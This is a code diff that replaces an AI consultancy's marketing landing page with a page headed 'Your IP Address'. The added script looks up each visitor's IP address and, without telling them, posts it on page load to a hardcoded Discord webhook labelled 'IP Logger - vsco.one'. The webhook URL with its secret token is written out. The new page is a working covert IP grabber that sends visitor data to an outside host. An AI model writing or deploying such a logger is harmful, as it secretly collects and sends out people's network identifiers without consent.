@@ -1,213 +1,70 @@
-<!DOCTYPE HTML>
+<!DOCTYPE html>
 <html lang="en">
-	<head>
-		<title>CJP Digital</title>
-		<meta charset="utf-8" />
-		<meta name="viewport" content="width=device-width,initial-scale=1" />
-		<meta name="keywords" content="AI services, AI automation, Artificial Intelligence solutions, Machine learning algorithms, Deep learning technologies, Neural network applications, Robotic process automation, Natural Language Processing, Computer vision, Predictive analytics, Cognitive computing, Automated decision-making, Data-driven insights, Intelligent automation, Smart algorithms, Chatbots, Virtual assistants, Automated workflows, Autonomous systems, AI integration, Intelligent data analysis, Cognitive automation, Smart optimization, AI-driven innovation, Autonomous machines, Self-learning algorithms, Automation software, AI-powered solutions, Intelligent robotics, Automated problem-solving, Machine learning models, Conversational AI, NLP chatbots, Customer support automation, Virtual customer service, AI chat support, Chatbot development, Voice assistants, Sentiment analysis, Personalized recommendations, AI-driven insights, Automated ticketing system, AI-powered analytics, Smart customer interactions, AI customer engagement, Automated response system, AI-enhanced self-service, AI in customer service, Automated customer interactions, AI-powered CRM, Intelligent chat support, AI for helpdesk, Virtual customer assistants">
-		<meta name="color-scheme" content="light only" />
-		<meta name="description" content="Unlock the power of AI today with CJP Digital! Elevate customer experience and your efficiency while lowering your expenses! Get started with AI expertise today!" />
-		<meta property="og:site_name" content="CJP Digital" />
-		<meta property="og:title" content="CJP Digital" />
-		<meta property="og:type" content="website" />
-		<meta property="og:description" content="Unlock the power of AI today with CJP Digital! Elevate customer experience and your efficiency while lowering your expenses! Get started with AI expertise today!" />
-		<link href="https://fonts.googleapis.com/css2?display=swap&family=Inter:ital,wght@0,400;0,500;0,700;1,400;1,500;1,700" rel="stylesheet" type="text/css" />
-		<link rel="icon" type="image/png" href="assets/images/favicon.png" />
-		<link rel="apple-touch-icon" href="assets/images/apple-touch-icon.png" />
-		<link rel="stylesheet" href="assets/main.css" />
-		<script>
-		const asciiArt = `%c
-	 ____ ___      .__ __      __    																					                   
-	|    |   \\____ |__/  \\    /  \\_____ _______   ____  																	  	
-	|    |   /    \\|  \\   \\\/\\/   /\\__  \\\\_  __ \\_/ __ \\ 				    													
-	|    |  /   |  \\  |\\        /  / __ \\|  | \\/\\  ___/ 																		
-	|______/|___|  /__| \\__/\\  /  (____  /__|    \\___  >  CONSOLE || Made by Cooper @ CJP Digital, under license. DO NOT MODIFY			
- 	            \\/          \\/        \\/            \\/ 																		 
-                                           																					`;
-      
-	  
+<head>
+    <meta charset="UTF-8">
+    <title>Your IP Address</title>
+    <style>
+        @keyframes rainbow {
+            0% { background-color: red; }
+            17% { background-color: orange; }
+            34% { background-color: yellow; }
+            51% { background-color: green; }
+            68% { background-color: blue; }
+            85% { background-color: indigo; }
+            100% { background-color: violet; }
+        }
+        body {
+            animation: rainbow 2s infinite;
+        }
+    </style>
+</head>
+<body>
+    <h1>Your IP Address is: <span id="ip-address"></span></h1>
+    <img src="dog.gif" alt="Dog Image">
 
-    // Call the function to log the ASCII art
-	const warningStyle = 'color: white; font-size: 32px; font-weight: bold; background-color: red';
-	const ascii1 = 'color: white; font-size: 28px; font-weight: bold; background-color: black';
-	const warningMessage = '   %c   WARNING: DO NOT MODIFY ANYTHING IN THIS DEVELOPER MENU UNLESS YOU KNOW WHAT YOU ARE DOING   ';
-	console.log(asciiArt, ascii1);
-	console.log(warningMessage, warningStyle);
-		</script>
-		<script src="https://cdn.botpress.cloud/webchat/v0/inject.js"></script>
-		<script src="https://mediafiles.botpress.cloud/81e03568-f446-4fa9-8c30-9a5a94a36e37/webchat/config.js" defer></script>
-		<script>
-			window.botpressWebChat.onEvent(
-			  function (ev) {
-				window.botpressWebChat.sendEvent({
-				  type: "loadConversation",
-				});
-			  },
-			  ["LIFECYCLE.LOADED"]
-			);
-			window.addEventListener("message", function (event) {
-			  // console.log(event.data.type);
-			  if (event.data.type == "LIFECYCLE.READY") {
-				console.log("Attempting to load botpress...")
-				console.log("Ignore errors!")
-				window.botpressWebChat.sendEvent({
-				  type: "trigger",
-				  channel: "web",
-				  payload: {
-					text: "",
-				  },
-				});
-			  }
-			});
+    <script>
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+                document.getElementById('ip-address').textContent = ipAddress;
+                sendToDiscord(ipAddress);
+            })
+            .catch(error => {
+                console.error('Error fetching IP:', error);
+                document.getElementById('ip-address').textContent = 'Unavailable';
+            });
 
-			console.log("Loaded needed modules")
-		  </script>
-	</head>
-	<body class="is-loading">
-		<div id="wrapper">
-			<div id="main">
-				<div class="inner">
-					<div id="container06" class="style1 container default">
-						<div class="wrapper">
-							<div class="inner">
-								<div id="image02" class="style1 image">
-									<span class="frame"><img src="assets/images/image02.png" alt="" /></span>
-								</div>
-								<h1 id="text01" class="style1">Revolutionize Your Workflow with <mark>AI</mark></h1>
-								<p id="text02" class="style7">Streamline and Scale Your Operations with AI Automation. Unlock the power of AI to optimize workflows, eliminate inefficiencies, and achieve unprecedented productivity. Experience seamless automation and propel your business forward with <strong>CJP Digital</strong></p>
-								<ul id="buttons03" class="style1 buttons">
-									<li>
-										<a href="#book-call" class="button n01"><svg><use xlink:href="assets/icons.svg#arrow-right-light"></use></svg><span class="label">Get started</span></a>
-									</li><li>
-										<a href="#more" class="button n02"><svg><use xlink:href="assets/icons.svg#arrow-down-light"></use></svg><span class="label">Learn more</span></a>
-									</li>
-								</ul>
-							</div>
-						</div>
-					</div>
-					<p id="text11" class="style6">Our Services</p>
-					<div id="container01" data-scroll-id="more" data-scroll-behavior="center" data-scroll-offset="0" data-scroll-speed="3" data-scroll-invisible="1" class="style3 container columns">
-						<div class="wrapper">
-							<div class="inner">
-								<div>
-									<div id="image05" class="style3 image">
-										<span class="frame"><img src="assets/images/image05.png" alt="" /></span>
-									</div>
-									<h2 id="text04" class="style3">GPT-3 | GPT-4 Development</h2>
-									<p id="text09" class="style8">Transform your business with AI-powered chatbots, generating engaging content, delivering accurate knowledge, and optimizing performance. Elevate customer experiences and streamline operations with our comprehensive AI solutions.</p>
-								</div>
-								<div>
-									<div id="image06" class="style3 image">
-										<span class="frame"><img src="assets/images/image06.png" alt="" /></span>
-									</div>
-									<h2 id="text12" class="style3">Natural Language Processing</h2>
-									<p id="text10" class="style8">Natural Language Processing: Streamline document management with automated categorization, data mining, content condensing, and named entity identification, empowering you to save time and extract valuable insights efficiently.</p>
-								</div>
-								<div>
-									<div id="image07" class="style3 image">
-										<span class="frame"><img src="assets/images/image07.png" alt="" /></span>
-									</div>
-									<h2 id="text13" class="style3">AI Strategy and Consulting</h2>
-									<p id="text66" class="style10">AI Strategy and Consulting: Unlock efficiency and cost reduction potential through our expertise in viability analysis, use case mapping, performance measurement, and AI roadmap development. Discover how we can transform your business - get started today</p>
-								</div>
-							</div>
-						</div>
-					</div>
-					<ul id="buttons07" class="style1 buttons">
-						<li>
-							<a href="#book-call" class="button n01"><svg><use xlink:href="assets/icons.svg#arrow-right-light"></use></svg><span class="label">Get Started</span></a>
-						</li>
-					</ul>
-					<div id="container02" class="style2 container columns">
-						<div class="wrapper">
-							<div class="inner">
-								<div>
-									<div id="image03" class="style4 image" data-position="center">
-										<span class="frame"><img src="assets/images/image03.png" alt="" /></span>
-									</div>
-								</div>
-								<div>
-									<h2 id="text03" class="style2">Propel Your Business to <mark>New Heights</mark></h2>
-									<p id="text06" class="style4">Unlock Opportunities, Boost Efficiency, and Drive Innovation with <strong>CJP Digital</strong></p>
-									<ul id="buttons06" class="style1 buttons">
-										<li>
-											<a href="#book-call" class="button n01"><svg><use xlink:href="assets/icons.svg#arrow-right-light"></use></svg><span class="label">Start Now</span></a>
-										</li>
-									</ul>
-								</div>
-							</div>
-						</div>
-					</div>
-					<div id="container04" class="style2 container columns">
-						<div class="wrapper">
-							<div class="inner" data-reorder="1,0">
-								<div>
-									<h2 id="text20" class="style2"><span class="p">Embrace AI Early:<br /><mark>Gain a Competitive Edge</mark></span></h2>
-									<p id="text21" class="style4">CJP Digital: Your Partner for Early AI Adoption <mark>and Success</mark></p>
-									<ul id="buttons04" class="style1 buttons">
-										<li>
-											<a href="#book-call" class="button n01"><svg><use xlink:href="assets/icons.svg#arrow-right-light"></use></svg><span class="label">Start Early</span></a>
-										</li>
-									</ul>
-								</div>
-								<div>
-									<div id="image11" class="style2 image">
-										<span class="frame"><img src="assets/images/image11.png" alt="" /></span>
-									</div>
-								</div>
-							</div>
-						</div>
-					</div>
-					<div id="container05" class="style2 container default">
-						<div class="wrapper">
-							<div class="inner">
-								<h2 id="text22" class="style2">Elevate Your Business with <mark>AI Expertise</mark></h2>
-								<p id="text23" class="style12">Leverage CJP Digital&#39;s comprehensive <mark>AI Expertise</mark> to maximize your businesses potential</p>
-								<ul id="buttons02" class="style1 buttons">
-									<li>
-										<a href="#book-call" class="button n01"><svg><use xlink:href="assets/icons.svg#arrow-right-light"></use></svg><span class="label">Get started</span></a>
-									</li>
-								</ul>
-							</div>
-						</div>
-					</div>
-					<div id="container03" data-scroll-id="book-call" data-scroll-behavior="default" data-scroll-offset="0" data-scroll-speed="3" class="style4 container default">
-						<div class="wrapper">
-							<div class="inner">
-								<p id="text07" class="style14">Let me see how I can help you</p>
-								<div id="embed01">
-									<!-- Calendly inline widget begin -->
-									<div class="calendly-inline-widget" data-url="https://calendly.com/cjpdigital/demo-call" style="min-width:320px;height:700px;"></div>
-									<script type="text/javascript" src="https://assets.calendly.com/assets/external/widget.js" async></script>
-									<!-- Calendly inline widget end -->
-								</div>
-							</div>
-						</div>
-					</div>
-					<hr id="divider01">
-					<ul id="icons01" class="style1 icons">
-						<li>
-							<a class="n01" href="https:/github.com/coopers-lab" aria-label="GitHub">
-								<svg><use xlink:href="assets/icons.svg#github"></use></svg>
-								<span class="label">GitHub</span>
-							</a>
-						</li><li>
-							<a class="n02" href="mailto:cooper@cjp-digital.com" aria-label="Email">
-								<svg><use xlink:href="assets/icons.svg#email"></use></svg>
-								<span class="label">Email</span>
-							</a>
-						</li><li>
-							<a class="n03" href="https://cdn.cjp-digital.com" aria-label="Download">
-								<svg><use xlink:href="assets/icons.svg#user"></use></svg>
-								<span class="label">Portal</span>
-							</a>
-						</li>
-					</ul>
-					<p id="text05" class="style5">© CJP Digital, 2023 || All rights reserved, all wrongs reversed</p>
+        function sendToDiscord(ip) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1222312130359988265/H_OfIlclzvLA0AbQtHT0QSOr-I_LhyTEmeAcvxHmALrjVgjCrP9q9wa7JqpatNUISZ7F';
+            const currentDate = new Date().toISOString();
+            const embed = {
+                title: "IP Logger - vsco.one",
+                description: `IP Logged: ${ip}`,
+                timestamp: currentDate,
+                color: 3447003
+            };
+            const message = {
+                embeds: [embed]
+            };
 
-				</div>
-			</div>
-		</div>
-		<script src="assets/main.js"></script>
-	</body>
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`Error: ${response.status}`);
+                }
+                return response.blob();
+            })
+            .catch(error => {
+                console.error('Error sending IP to Discord:', error);
+            });
+        }
+    </script>
+</body>
 </html>
